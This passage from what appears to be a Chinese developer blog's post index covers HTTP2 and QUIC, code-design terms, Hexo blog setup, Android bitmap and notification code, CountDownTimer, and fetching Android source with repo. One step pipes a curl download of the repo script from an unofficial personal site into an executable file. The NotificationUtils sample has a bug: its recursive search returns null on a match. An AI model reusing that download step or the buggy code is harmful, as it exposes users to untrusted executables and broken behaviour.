HTTP1.1的协议里，在一个连接里传送数据都是串行顺序传送的，必须等上一个请求全部处理完后，下一个请求才能进行处理，导致这些请求期间这条连接并不是满带宽传输的，即使是HTTP1.1的pipelining可以同时发送多个request，但response仍是按请求的顺序串行返回，只要其中一个请求的response稍微大一点或发生错误，就会阻塞住后面的请求。 HTTP2 这里的多路复用协议解决了这些问题，它把在连接里传输的数据都封装成一个个stream，每个stream都有标识，stream的发送和接收可以是乱序的，不依赖顺序，也就不会有阻塞的问题，接收端可以根据stream的标识去区分属于哪个请求，再进行数据拼接，得到最终数据。 解释下多路复用这个词，多路可以认为是多个连接，多个操作，复用就是字面上的意思，复用一条连接或一个线程。HTTP2这里是连接的多路复用，网络相关的还有一个I/O的多路复用(select/epoll)，指通过事件驱动的方式让多个网络请求返回的数据在同一条线程里完成读写。 客户端来说，iOS9 以上 NSURLSession 原生支持 HTTP2，只要服务端也支持就可以直接使用，Android 的 okhttp3 以上也支持了 HTTP2，国内一些大型 APP 会自建网络层，支持 HTTP2 的多路复用，避免系统的限制以及根据自身业务需要增加一些特性，例如微信的开源网络库 mars，做到一条长连接处理微信上的大部分请求，多路复用的特性上基本跟 HTTP2 一致。 TCP队头阻塞HTTP2 的多路复用看起来是完美的解决方案，但还有个问题，就是队头阻塞，这是受限于 TCP 协议，TCP 协议为了保证数据的可靠性，若传输过程中一个 TCP 包丢失，会等待这个包重传后，才会处理后续的包。HTTP2的多路复用让所有请求都在同一条连接进行，中间有一个包丢失，就会阻塞等待重传，所有请求也就被阻塞了。 对于这个问题不改变 TCP 协议就无法优化，但 TCP 协议依赖操作系统实现以及部分硬件的定制，改进缓慢，于是 GOOGLE 提出 QUIC 协议，相当于在 UDP 协议之上再定义一套可靠传输协议，解决 TCP 的一些缺陷，包括队头阻塞。具体解决原理网上资料较多，可以看看。 QUIC 处于起步阶段，少有客户端接入，QUIC 协议相对于 HTTP2 最大的优势是对TCP队头阻塞的解决，其他的像安全握手 0RTT / 证书压缩等优化 TLS1.3 已跟进，可以用于 HTTP2，并不是独有特性。TCP 队头阻塞在 HTTP2 上对性能的影响有多大，在速度上 QUIC 能带来多大提升待研究。 数据第三个问题，传输数据大小的问题。数据对请求速度的影响分两方面，一是压缩率，二是解压序列化反序列化的速度。目前最流行的两种数据格式是 json 和 protobuf，json 是字符串，protobuf 是二进制，即使用各种压缩算法压缩后，protobuf 仍会比 json 小，数据量上 protobuf 有优势，序列化速度 protobuf 也有一些优势，这两者的对比就不细说了。 压缩算法多种多样，也在不断演进，最新出的 Brotli 和Z-standard实现了更高的压缩率，Z-standard 可以根据业务数据样本训练出适合的字典，进一步提高压缩率，目前压缩率表现最好的算法。 除了传输的 body 数据，每个请求 HTTP 协议头的数据也是不可忽视，HTTP2 里对 HTTP 协议头也进行了压缩，HTTP 头大多是重复数据，固定的字段如 method 可以用静态字典，不固定但多个请求重复的字段例如 cookie 用动态字典，可以达到非常高的压缩率，这里有详细介绍。 通过 HTTPDNS，连接多路复用，更好的数据压缩算法，可以把网络请求的速度优化到较不错的程度了，接下来再看看弱网和安全上可以做的事情。 弱网手机无线网络环境不稳定，针对弱网的优化，微信有较多实践和分享，包括： 提升连接成功率复合连接，建立连接时，阶梯式并发连接，其中一条连通后其他连接都关闭。这个方案结合串行和并发的优势，提高弱网下的连接成功率，同时又不会增加服务器资源消耗： 制定最合适的超时时间对总读写超时(从请求到响应的超时)、首包超时、包包超时(两个数据段之间的超时)时间制定不同的计算方案，加快对超时的判断，减少等待时间，尽早重试。这里的超时时间还可以根据网络状态动态设定。 调优TCP参数，使用TCP优化算法。对服务端的TCP协议参数进行调优，以及开启各种优化算法，使得适合业务特性和移动端网络环境，包括RTO初始值，混合慢启动，TLP，F-RTO等。 针对弱网的这些细致优化未成为标准，系统网络库没有内置，不过前两个客户端优化微信的开源网络库 mars 有实现，若有需要可以使用。 安全标准协议 TLS 保证了网络传输的安全，前身是 SSL，不断在演进，目前最新是 TLS1.3。常见的 HTTPS 就是 HTTP 协议加上 TLS 安全协议。 安全协议概括性地说解决两个问题：1.保证安全 2. 降低加密成本 在保证安全上： 使用加密算法组合对传输数据加密，避免被窃听和篡改。 认证对方身份，避免被第三方冒充。 加密算法保持灵活可更新，防止定死算法被破解后无法更换，禁用已被破解的算法。 降低加密成本上： 用对称加密算法加密传输数据，解决非对称加密算法的性能低以及长度限制问题。 缓存安全协议握手后的密钥等数据，加快第二次建连的速度。 加快握手过程：2RTT-&gt; 0RTT。加快握手的思路，就是原本客户端和服务端需要协商使用什么算法后才能加密发送数据，变成通过内置的公钥和默认的算法，在握手的同时就把数据发出去，也就是不需要等待握手就开始发送数据，达到0RTT。 这些点涉及的细节非常多，对 TLS 的介绍有一篇雄文，说得很详细，在此推荐。 目前基本主流都支持 TLS1.2，iOS 网络库默认使用 TLS1.2，Android4.4 以上支持 1.2。TLS1.3 iOS 还处于测试阶段，Android 未查到消息。对于普通 APP，只要正确配置证书，TLS1.2 已经能保证传输安全，只是在建连速度上会有所损耗，有一些大型 APP 像微信就自行实现了 TLS1.3 的部分协议，早一步全平台支持。","categories":[{"name":"计算机网络","slug":"计算机网络","permalink":"https://superxlcr.github.io/categories/计算机网络/"}],"tags":[{"name":"计算机网络","slug":"计算机网络","permalink":"https://superxlcr.github.io/tags/计算机网络/"}]},{"title":"为什么“耦合”概念该要摒弃","slug":"为什么“耦合”概念该要摒弃","date":"2018-03-25T14:13:25.000Z","updated":"2020-05-11T07:23:44.796Z","comments":true,"path":"2018/03/25/为什么“耦合”概念该要摒弃/","link":"","permalink":"https://superxlcr.github.io/2018/03/25/为什么“耦合”概念该要摒弃/","excerpt":"","text":"本文转载自：https://zhuanlan.zhihu.com/p/20145361?refer=yangbo 以前，我写代码时，我考虑模块（本文中的模块就是指单个源文件）的单向依赖关系，考虑接口的正交性和紧凑性。我觉得我在做低耦合的好设计。 然而，我发现其他程序员写的代码依赖关系混乱，接口臃肿，但他们仍然觉得自己写的代码耦合很低，设计很好。我这才发现，我理解的耦合和他们理解的不一样。他们理解的低耦合就是把代码提出来，让代码不要“乱”。然而，对于什么是“耦合”、什么是“乱”，他们并不知道有什么客观标准可以度量。 所以，现在我相信“耦合”是个有歧义的坏词，“低耦合”是个程序员经常误用的理论。我建议，设计架构、考察模块之间关系时，不要用“耦合”、“乱”这些无法度量的词语，而应该改用以下三个可以度量的指标：依赖、正交性、紧凑性。 依赖和耦合的最大区别在于，当我们说“A和B耦合”时，在字面含义中，A和B二者平等。然而，正确的模块关系根本不应该平等，而应该是单向依赖才对。所以我们应该说“A依赖B”，这样含义要清楚得多。A依赖B意味着，A模块可以调用B模块暴露的API，但B模块绝不允许调用A模块的API。单向依赖是红线，好的设计一定不会违反这条红线。 注意：根据实质重于形式原则，本文中的“依赖”指人脑中的依赖而不是编译器的依赖。只要程序员编写模块A时，需要知道模块B的存在，需要知道模块B提供哪些功能，A对B依赖就存在。甚至就算通过所谓的命名查找之类的“解耦”手段，让模块A不需要import B或者include “B.h”，人脑中的依赖仍旧一点都没有变化。唯一的作用是会骗过后文会提到的代码打分工具，让工具误以为两个模块间没有依赖。 很多程序员觉得“耦合”是坏事，爱写兜圈子的代码来消除所谓的“耦合”。但是我们改用“依赖”术语后，我们就发现单向依赖不是坏事，根本不必费心消除，因为，真正的重点是，依赖关系中，被依赖方暴露的接口能不能足够“正交”和“紧凑”。 正交性是指一个模块提供的API中，多个方法之间是否有重复的功能。如果有重复功能，正交性就差。通常，正交性高的模块更稳定，不会因为上层业务变化而被迫修改代码。好的API内部的多个方法之间不应该有任何重复功能，只实现正交的机制。 如果感觉拆得太细使用不便，应该在底层API之外包装出一层Helper、Utility组成的胶水层。胶水层调用底层原语API来实现常用模式供上层使用。对于胶水层中的模块，对正交性的要求可以稍低一些。注意上层代码既可以直接调用正交的底层API，又可以调用胶水层的常用模式。 紧凑性是指一个模块提供的API中，公有方法总数必须很少，每个方法的参数也必须很少。《Unix编程艺术》上说一个模块不要超过7个方法，不然就很难理解。但我实践中发现，我一般编写的模块，公有方法通常不超过3个。 总之，单向依赖、正交性、紧凑性这三个指标都很务实，有客观方法可以度量。我觉得也许可以代替“低耦合”这种“公说公有理婆说婆有理”的务虚理论。比如前两天我们ThoughtWorks的咨询师邮件列表中就有人分享一些工具，用上述标准自动检查代码质量。那么将来你和别的程序员约架，你要喷对方代码写得烂，你就有了依据，因为你可以直接用工具给代码打分。 另外，将来如果有同事或者网友在讨论编程时，用了“耦合”、“解耦”、“乱”之类的混乱术语，你可以把这篇文章发给他看，然后鄙视他。","categories":[{"name":"程序设计","slug":"程序设计","permalink":"https://superxlcr.github.io/categories/程序设计/"}],"tags":[{"name":"程序设计","slug":"程序设计","permalink":"https://superxlcr.github.io/tags/程序设计/"}]},{"title":"我的blog搬迁之旅","slug":"我的blog搬迁之旅","date":"2018-03-23T16:21:12.000Z","updated":"2020-05-11T07:23:44.850Z","comments":true,"path":"2018/03/24/我的blog搬迁之旅/","link":"","permalink":"https://superxlcr.github.io/2018/03/24/我的blog搬迁之旅/","excerpt":"","text":"前言本来博客是搭在csdn上面的，也就是当个云记事本来使用不料csdn的服务器感觉不是特别的友好啊……老是登不上去什么鬼乱七八糟的，现在又弄了个新的编辑器，但并不是特别好用orz因此，思前想后，觉得还是把自己的博客搬到github上面好了在此，记录一下要做的工作吧，使得以后再次搬迁的时候尽量快点吧 搭建本地hexo环境首先，去官网下载node.js：https://nodejs.org/en/下载安装完成后，通过指令可以看到node.js的版本 1node -v 接着，通过npm下载安装hexo 12npm install hexo-cli -gnpm install hexo --save 下载完后，通过指令可以看到hexo的版本 1hexo -v 然后，我们需要创建一个空文件夹，并在下面执行指令初始化hexo 12hexo inithexo install 接着，我们通过指令来生成并运行hexo 12hexo ghexo s 下面的指令也能达到同样的效果 1hexo s -g 最后，如果我们需要修改hexo的相关配置，可以修改根目录下的_config.yml文件如果我们想要使用新的hexo主题，下载资源文件到theme文件夹中，并修改配置文件即可至此，本地hexo环境配置基本结束 编写博客使用以下指令即可 1hexo new post \"title\" 详情可查看官方doc：https://hexo.io/docs/writing.html 创建 github io repository首先，创建一个 &lt;username&gt;.github.io 的库然后，选择右上角的 Settings 选项，里面的 Github Pages 选项，随便选择一个主题处理成功后，就能访问 &lt;username&gt;.github.io 的博客页面了 关联github并部署首先我们需要设置user.name、user.email以及ssh key等东西（教程百度吧）接着需要在根目录的_config.yml文件中，修改相应的属性 1234deploy: type: git repo: git@github.com:yourname/yourname.github.io.git branch: master 接着我们需要通过以下指令安装关联插件 1npm install hexo-deployer-git --save 接着，我们通过指令来生成并部署hexo 12hexo ghexo d 下面的指令也能达到同样的效果 1hexo d -g 所有的搭建博客步骤已记录完毕，接下来就开始进行博客搬迁的工作吧 博客搬迁工具本人之前的博客都是在csdn写的，在刚开始搬迁博客的时候，手动搬迁了一阵子，发现是真滴累……后面通过python写了个csdn博客转换工具，能把csdn博客转换为hexo适用的markdonw形式git地址如下：https://github.com/superxlcr/blogTranslator","categories":[{"name":"杂项","slug":"杂项","permalink":"https://superxlcr.github.io/categories/杂项/"}],"tags":[{"name":"杂项","slug":"杂项","permalink":"https://superxlcr.github.io/tags/杂项/"},{"name":"博客","slug":"博客","permalink":"https://superxlcr.github.io/tags/博客/"}]},{"title":"Android App 性能优化之图片优化","slug":"Android-App-性能优化之图片优化","date":"2018-03-13T12:54:07.000Z","updated":"2020-05-11T07:23:44.495Z","comments":true,"path":"2018/03/13/Android-App-性能优化之图片优化/","link":"","permalink":"https://superxlcr.github.io/2018/03/13/Android-App-性能优化之图片优化/","excerpt":"","text":"本文转载自：http://blog.csdn.net/huang_rong12/article/details/51676125 接下来说明一下关于其他内存问题。图片问题，作为一个优秀的Android开发者，在图片的类型选择，图片显示前的处理都是要好好考虑的，因为不同类型图片在Android中的显示代价是不同的，使用不同显示方式代价也是不同的，首先看一下图片类型png与jpg两种类型显示代价有不同，原因在于png占的内存较多，但解码叫简单，若png图片过多，会容易垃圾回收，甚至内存溢出，而jpg的内存小，但解码复杂，会花更多时间解码，所以要根据具体情况来定，如果当前是由于内存问题导致垃圾回收频繁执行导致卡慢顿，这样图片优化就减少png，如果是非内存问题导致的，就可以使用png。谷歌官方说法如下： Smaller PNG Files（较少的png文件）尽量减少PNG图片的大小是Android里面很重要的一条规范。相比起JPEG，PNG能够提供更加清晰无损的图片，但是PNG格式的图片会更大，占用更多的磁盘空间。到底是使用PNG还是JPEG，需要设计师仔细衡量，对于那些使用JPEG就可以达到视觉效果的，可以考虑采用JPEG即可。谷歌官方这样说应该是由于Android上导致卡慢顿的大多数原因是和内存有关吧。关于在图片显示前的操作： Pre-scaling Bitmaps（预放缩图片）对bitmap做缩放，这也是Android里面最遇到的问题。对bitmap做缩放的意义很明显，提示显示性能，避免分配不必要的内存。Android提供了现成的bitmap缩放的API，叫做createScaledBitmap()，使用这个方法可以获取到一张经过缩放的图片。 上面的方法能够快速的得到一张经过缩放的图片，可是这个方法能够执行的前提是，原图片需要事先加载到内存中，如果原图片过大，很可能导致OOM。下面介绍其他几种缩放图片的方式。inSampleSize能够等比的缩放显示图片，同时还避免了需要先把原图加载进内存的缺点。我们会使用类似像下面一样的方法来缩放bitmap： 另外，我们还可以使用inScaled，inDensity，inTargetDensity的属性来对解码图片做处理，源码如下图所示： （注：这里的bitmapoption还可以知道图片的编码类型）还有一个经常使用到的技巧是inJustDecodeBounds，使用这个属性去尝试解码图片，可以事先获取到图片的大小而不至于占用什么内存。如下图所示： Re-using Bitmaps（重复使用bitmaps）我们知道bitmap会占用大量的内存空间，这节会讲解什么是inBitmap属性，如何利用这个属性来提升bitmap的循环效率。前面我们介绍过使用对象池的技术来解决对象频繁创建再回收的效率问题，使用这种方法，bitmap占用的内存空间会差不多是恒定的数值，每次新创建出来的bitmap都会需要占用一块单独的内存区域，如下图所示： 为了解决上图所示的效率问题，Android在解码图片的时候引进了inBitmap属性，使用这个属性可以得到下图所示的效果： 使用inBitmap属性可以告知Bitmap解码器去尝试使用已经存在的内存区域，新解码的bitmap会尝试去使用之前那张bitmap在heap中所占据的pixel data内存区域，而不是去问内存重新申请一块区域来存放bitmap。利用这种特性，即使是上千张的图片，也只会仅仅只需要占用屏幕所能够显示的图片数量的内存大小。下面是如何使用inBitmap的代码示例： 使用inBitmap需要注意几个限制条件：·在SDK 11 -&gt; 18之间，重用的bitmap大小必须是一致的，例如给inBitmap赋值的图片大小为100-100，那么新申请的bitmap必须也为100-100才能够被重用。从SDK 19开始，新申请的bitmap大小必须小于或者等于已经赋值过的bitmap大小。·新申请的bitmap与旧的bitmap必须有相同的解码格式，例如大家都是8888的，如果前面的bitmap是8888，那么就不能支持4444与565格式的bitmap了，不同的编码格式占用的内存是不同的，有时候也可以根据需求指定编码格式。我们可以创建一个包含多种典型可重用bitmap的对象池，这样后续的bitmap创建都能够找到合适的“模板”去进行重用。如下图所示： Google介绍了一个开源的加载bitmap的库：Glide，这里面包含了各种对bitmap 前面提到编码方式，其实不同的编码方式占用内存是不同的当然显示效果也是有区别的，可以在不影响用户体验的前提下，适当选择编码方式。 Smaller Pixel Formats常见的png,jpeg,webp等格式的图片在设置到UI上之前需要经过解码的过程，而解压时可以选择不同的解码率，不同的解码率对内存的占用是有很大差别的。在不影响到画质的前提下尽量减少内存的占用，这能够显著提升应用程序的性能。Android的Heap空间是不会自动做兼容压缩的，意思就是如果Heap空间中的图片被收回之后，这块区域并不会和其他已经回收过的区域做重新排序合并处理，那么当一个更大的图片需要放到heap之前，很可能找不到那么大的连续空闲区域，那么就会触发GC，使得heap腾出一块足以放下这张图片的空闲区域，如果无法腾出，就会发生OOM。如下图所示： 所以为了避免加载一张超大的图片，需要尽量减少这张图片所占用的内存大小，Android为图片提供了4种解码格式，Android默认是使用argb8888格式，还有argb4444，alpha8及rgb565： 对于不同解码格式占用内存大小具体如下： Bitmap.Config ARGB_4444：每个像素占四位，即A=4，R=4，G=4，B=4，那么一个像素点占4+4+4+4=16位 Bitmap.Config ARGB_8888：每个像素占四位，即A=8，R=8，G=8，B=8，那么一个像素点占8+8+8+8=32位 Bitmap.Config RGB_565：每个像素占四位，即R=5，G=6，B=5，没有透明度，那么一个像素点占5+6+5=16位 Bitmap.Config ALPHA_8：每个像素占四位，只有透明度，没有颜色。 一般情况下我们都是使用的ARGB_8888，由此可知它是最占内存的，因为一个像素占32位，8位=1字节，所以一个像素占4字节的内存。假设有一张480x800的图片，如果格式为ARGB_8888，那么将会占用1500KB的内存。 随着解码占用内存大小的降低，清晰度也会有损失。我们需要针对不同的应用场景做不同的处理，大图和小图可以采用不同的解码率。在Android里面可以通过下面的代码来设置解码率： 实际上，一张图片在内存中占用多大空间主要受图片本身大小（分辨率），解码方式，还有就是设备像素密度这三个因素影响，其中像素密度是由设备定的，编程人员可控性不高。所以解决一张图片在内存中大小问题，就得从图片分辨率和解码方式入手。 注意： Bitmap 对象在不使用时，我们应该先调用recycle（）释放内存，然后才置空，因为加载bitmap对象的内存空间，一部分是java的，一部分是c的（因为Bitmap分配的底层是通过jni调用的,BitMap底层是skia图形库，skia图形库是c实现的，通过jni的方法在java层进行封装）。这个recycle（）函数就是针对c部分的内存释放。","categories":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/categories/android/"}],"tags":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/tags/android/"},{"name":"内存","slug":"内存","permalink":"https://superxlcr.github.io/tags/内存/"}]},{"title":"Android 自定义Notification颜色适配问题","slug":"Android-自定义Notification颜色适配问题","date":"2018-02-04T08:05:57.000Z","updated":"2020-05-11T07:23:44.543Z","comments":true,"path":"2018/02/04/Android-自定义Notification颜色适配问题/","link":"","permalink":"https://superxlcr.github.io/2018/02/04/Android-自定义Notification颜色适配问题/","excerpt":"","text":"最近完成了一个需要自定义RemoteViews的Notification的需求，期间遇到了不少关于颜色适配的问题，在此做一下总结在Notification上使用我们自定义的RemoteViews时，通知栏的背景色、标题文字色跟内容文字色是我们需要注意的三种颜色，如果设置不当，可能会导致我们自定义的通知栏的通知看不清楚一般而言，我们可以通过： 不设置自定义view的背景色，标题与内容设置系统的style来解决这个问题：SDK21以下： 1234// 标题样式android:textAppearance=\"@android:style/TextAppearance.StatusBar.EventContent.Title\"// 内容样式android:textAppearance=\"@android:style/TextAppearance.StatusBar.EventContent\" SDK21以及以上： 1234// 标题样式android:textAppearance=\"@android:style/TextAppearance.Material.Notification.Title\"// 内容样式android:textAppearance=\"@android:style/TextAppearance.Material.Notification.Info\" 但是实际测试中发现，在某些国产机型上会出现设置错误的标题跟内容文字颜色的问题因此，这边通过先构造一个系统的Notification，再取出其中对应颜色的方法，写了一个获取通知栏颜色的工具类： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121/** * Created by superxlcr on 2018/2/4. * * 获取通知栏颜色工具类 */public class NotificationUtils &#123; //&lt;editor-fold desc=\"property\"&gt; private static final String TITLE = \"title\"; private static final String CONTENT = \"content\"; private static final float COLOR_THRESHOLD = 180f; private static int backgroundColor = Color.TRANSPARENT; private static int titleColor = Color.WHITE; private static int contentColor = Color.WHITE; private static boolean checkDeviceColors = false; //&lt;/editor-fold&gt; //&lt;editor-fold desc=\"public\"&gt; /** * 获取Notification背景色 * * @param context 上下文 * @return 背景色，获取失败时默认为 透明色 */ public static int getBackgroundColor(Context context) &#123; checkDeviceColors(context); return backgroundColor; &#125; /** * 获取Notification标题色 * * @param context 上下文 * @return 标题色，获取失败时默认为 白色 */ public static int getTitleColor(Context context) &#123; checkDeviceColors(context); return titleColor; &#125; /** * 获取Notification内容色 * * @param context 上下文 * @return 内容色，获取失败时默认为 白色 */ public static int getContentColor(Context context) &#123; checkDeviceColors(context); return contentColor; &#125; //&lt;/editor-fold&gt; //&lt;editor-fold desc=\"private\"&gt; private NotificationUtils() &#123; &#125; private static void checkDeviceColors(Context context) &#123; if (checkDeviceColors || context == null) &#123; return; &#125; checkDeviceColors = true; NotificationCompat.Builder builder = new NotificationCompat.Builder(context); Notification notification = builder.setContentTitle(TITLE).setContentText(CONTENT).build(); View notificationView = notification.contentView.apply(context, new LinearLayout(context)); if (notificationView instanceof ViewGroup) &#123; TextView title = findTextViewByText((ViewGroup) notificationView, TITLE); if (title != null) &#123; titleColor = title.getCurrentTextColor(); // 黑色标题使用白色背景，其他标题使用透明背景 if (isSimilarColor(Color.BLACK, titleColor)) &#123; backgroundColor = Color.WHITE; &#125; else &#123; backgroundColor = Color.TRANSPARENT; &#125; &#125; TextView content = findTextViewByText((ViewGroup) notificationView, CONTENT); if (content != null) &#123; contentColor = content.getCurrentTextColor(); &#125; &#125; &#125; private static TextView findTextViewByText(ViewGroup viewGroup, String text) &#123; if (viewGroup == null) &#123; return null; &#125; int size = viewGroup.getChildCount(); for (int i = 0; i &lt; size; i++) &#123; View view = viewGroup.getChildAt(i); if (view instanceof TextView) &#123; TextView textView = (TextView) view; if (TextUtils.equals(textView.getText(), text)) &#123; return textView; &#125; &#125; else if (view instanceof ViewGroup) &#123; TextView textView = findTextViewByText((ViewGroup) view, text); if (textView != null) &#123; return null; &#125; &#125; &#125; return null; &#125; private static boolean isSimilarColor(int baseColor, int color) &#123; int simpleBaseColor = baseColor | 0xff000000; int simpleColor = color | 0xff000000; int baseRed = Color.red(simpleBaseColor) - Color.red(simpleColor); int baseGreen = Color.green(simpleBaseColor) - Color.green(simpleColor); int baseBlue = Color.blue(simpleBaseColor) - Color.blue(simpleColor); double value = Math.sqrt(baseRed * baseRed + baseGreen * baseGreen + baseBlue * baseBlue); return value &lt; COLOR_THRESHOLD; &#125; //&lt;/editor-fold&gt;&#125; 其中，由于Android的通知栏底色一般为白色、黑色或者透明，因此在工具类中根据标题文字色的颜色，为背景对应设置白色或透明","categories":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/categories/android/"}],"tags":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/tags/android/"}]},{"title":"Android CountDownTimer的使用","slug":"Android-CountDownTimer的使用","date":"2018-01-07T12:21:43.000Z","updated":"2020-05-11T07:23:44.501Z","comments":true,"path":"2018/01/07/Android-CountDownTimer的使用/","link":"","permalink":"https://superxlcr.github.io/2018/01/07/Android-CountDownTimer的使用/","excerpt":"","text":"最近博主需要实现一个倒计时相关的功能，被推荐了Android的CountDownTimer工具类，在此说一下CountDownTimer的使用以及源码的解读以下是一个总计10秒倒计时，每间隔1秒进行回调的例子： 123456789101112CountDownTimer timer = new CountDownTimer(10000, 1000) &#123; @Override public void onTick(long millisUntilFinished) &#123; // do something &#125; @Override public void onFinish() &#123; // do something &#125;&#125;;timer.start(); 每间隔1秒，CountDownTimer便会调用onTick回调方法执行相应操作 当倒计时结束后，CountDownTimer会调用onFinish回调方法执行相应的操作 看完CountDownTimer的例子后，我们可以看一下CountDownTimer的源码以加深对该工具类的理解，源码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113public abstract class CountDownTimer &#123; /** * Millis since epoch when alarm should stop. */ private final long mMillisInFuture; /** * The interval in millis that the user receives callbacks */ private final long mCountdownInterval; private long mStopTimeInFuture; /** * boolean representing if the timer was cancelled */ private boolean mCancelled = false; /** * @param millisInFuture The number of millis in the future from the call * to &#123;@link #start()&#125; until the countdown is done and &#123;@link #onFinish()&#125; * is called. * @param countDownInterval The interval along the way to receive * &#123;@link #onTick(long)&#125; callbacks. */ public CountDownTimer(long millisInFuture, long countDownInterval) &#123; mMillisInFuture = millisInFuture; mCountdownInterval = countDownInterval; &#125; /** * Cancel the countdown. */ public synchronized final void cancel() &#123; mCancelled = true; mHandler.removeMessages(MSG); &#125; /** * Start the countdown. */ public synchronized final CountDownTimer start() &#123; mCancelled = false; if (mMillisInFuture &lt;= 0) &#123; onFinish(); return this; &#125; mStopTimeInFuture = SystemClock.elapsedRealtime() + mMillisInFuture; mHandler.sendMessage(mHandler.obtainMessage(MSG)); return this; &#125; /** * Callback fired on regular interval. * @param millisUntilFinished The amount of time until finished. */ public abstract void onTick(long millisUntilFinished); /** * Callback fired when the time is up. */ public abstract void onFinish(); private static final int MSG = 1; // handles counting down private Handler mHandler = new Handler() &#123; @Override public void handleMessage(Message msg) &#123; synchronized (CountDownTimer.this) &#123; if (mCancelled) &#123; return; &#125; final long millisLeft = mStopTimeInFuture - SystemClock.elapsedRealtime(); if (millisLeft &lt;= 0) &#123; onFinish(); &#125; else &#123; long lastTickStart = SystemClock.elapsedRealtime(); onTick(millisLeft); // take into account user's onTick taking time to execute long lastTickDuration = SystemClock.elapsedRealtime() - lastTickStart; long delay; if (millisLeft &lt; mCountdownInterval) &#123; // just delay until done delay = millisLeft - lastTickDuration; // special case: user's onTick took more than interval to // complete, trigger onFinish without delay if (delay &lt; 0) delay = 0; &#125; else &#123; delay = mCountdownInterval - lastTickDuration; // special case: user's onTick took more than interval to // complete, skip to next interval while (delay &lt; 0) delay += mCountdownInterval; &#125; sendMessageDelayed(obtainMessage(MSG), delay); &#125; &#125; &#125; &#125;;&#125; 源码并不算长，CountDownTimer作为一个抽象类，其主要方法有如下几个： start：开始进行倒计时 cancel：取消倒计时 onTick：抽象方法，用于倒计时间隔回调 onFinish：抽象方法，用于倒计时结束时回调 看过CountDownTimer的源码后，有几个细节我们需要稍微注意一下： 在源码第38行中，CountDownTimer会判断是否倒计时已结束，如果是则调用onFinish方法，否则调用onTick方法。因此，在倒计时的最后一秒时，我们并不会收到onTick的回调，取而代之的是onFinish的回调。 从源码可以看出，CountDownTimer其实与Timer完全没有任何关系，它的倒计时实现是使用Handler机制实现的，因此当我们在非UI线程使用该工具时，需要先初始化Looper 同上，由于CountDownTimer是基于Handler实现的，其处理以及发送message以及回调onTick处于同一线程，因此当我们在回调方法onTick耗时过多时，可能会影响CountDownTimer预估的回调次数（见源码144行）","categories":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/categories/android/"}],"tags":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/tags/android/"}]},{"title":"Android compileSdkVersion 23 导致apache网络库HttpClient过期问题","slug":"Android-compileSdkVersion-23-导致apache网络库HttpClient过期问题","date":"2018-01-03T12:05:33.000Z","updated":"2020-05-11T07:23:44.525Z","comments":true,"path":"2018/01/03/Android-compileSdkVersion-23-导致apache网络库HttpClient过期问题/","link":"","permalink":"https://superxlcr.github.io/2018/01/03/Android-compileSdkVersion-23-导致apache网络库HttpClient过期问题/","excerpt":"","text":"博主最近在升级项目compileSdkVersion的时候遇到了一个尴尬的问题：当compileSdkVersion设置为23后，即就是android6.0版本更新以后，Android就不再提供org.apache.http.x包了，而是改为使用HttpUrlConnection了然后博主所在的项目比较旧，并不能轻易从apache网络库(即HttpClient)切换至HttpUrlConnection根据官方文档，解决办法是，只要在gradle的编译文件中添加相应参数就好了： 1234567android &#123; ... useLibrary &apos;org.apache.http.legacy&apos; ...&#125; 官方文档可参见下面地址： https://developer.android.com/about/versions/marshmallow/android-6.0-changes.html","categories":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/categories/android/"}],"tags":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/tags/android/"}]},{"title":"Android源码下载repo以及repo init总结","slug":"Android源码下载repo以及repo-init总结","date":"2017-12-31T08:07:19.000Z","updated":"2020-05-11T07:23:44.603Z","comments":true,"path":"2017/12/31/Android源码下载repo以及repo-init总结/","link":"","permalink":"https://superxlcr.github.io/2017/12/31/Android源码下载repo以及repo-init总结/","excerpt":"","text":"最近下载了一波Android的源码，由于google源码被墙，以及编译环境等一系列问题，搞得头皮发麻，在此写下一篇博客记录一下由于看的书是《Android系统源代码情景分析》，我们下载的目标源码是Android 2.3.4，因此我们需要使用的是Ubutun 12.04版本的系统，否则编译源码时会出现一堆奇怪的问题首先，我们需要安装java1.6，然后再安装git和一系列的编译一堆工具： 1sudo apt-get install git-core gnupg 1sudo apt-get install flex bison gperf libsdl-dev libesd0-dev libwxgtk3.0-dev build-essential zip curl valgrind 然后下载google提供的下载源码的repo工具，在合适的目录下执行命令下载repo，并把它改为可执行文件即可： 12curl &quot;http://php.webtutor.pl/en/wp-content/uploads/2011/09/repo&quot; &gt; repochmod a+x repo 然后由于google背墙的原因，我们需要修改以下参数：把repo中的 REPO_URL 改为 REPO_URL=’http://code.google.com/p/git-repo/&#39;然后再repo的目录下执行init指令即可： 1repo init -u git://Android.git.linaro.org/platform/manifest.git -b android-2.3.4_r1 初始化完成后，我们再修改下init目录下的隐藏文件.repo中的manifest.xml文件：把fetch=”git://Android.git.kernel.org/“改为fetch=”git://Android.git.linaro.org/“ 然后执行 repo sync 指令开始下载Android源代码由于下载源码的指令经常会由于网络原因莫名奇妙中断掉，在此分享一个中断后会自动重新执行repo sync的sh脚本： 123456#!/bin/shrepo syncwhile [ $? -ne 0 ]dorepo syncdone 我们保存改脚本并改为可执行文件后，执行sh xxx.sh开始同步源码即可，在源码下载完成后脚本会自行终止在下载完Android源码后，我们还可以下载Android的内核源码，由于内核源码也是被墙了，原地址根本下不动，因此我们需要通过国内镜像来下载： 名称 Google GIT地址 清华服务器地址 common https://android.googlesource.com/kernel/common.git https://aosp.tuna.tsinghua.edu.cn/kernel/common.git exynos https://android.googlesource.com/kernel/exynos.git https://aosp.tuna.tsinghua.edu.cn/kernel/exynos.git goldfish https://android.googlesource.com/kernel/goldfish.git https://aosp.tuna.tsinghua.edu.cn/kernel/goldfish.git hikey-linaro https://android.googlesource.com/kernel/hikey-linaro https://aosp.tuna.tsinghua.edu.cn/kernel/hikey-linaro.git lk https://aosp.tuna.tsinghua.edu.cn/kernel/lk.git omap 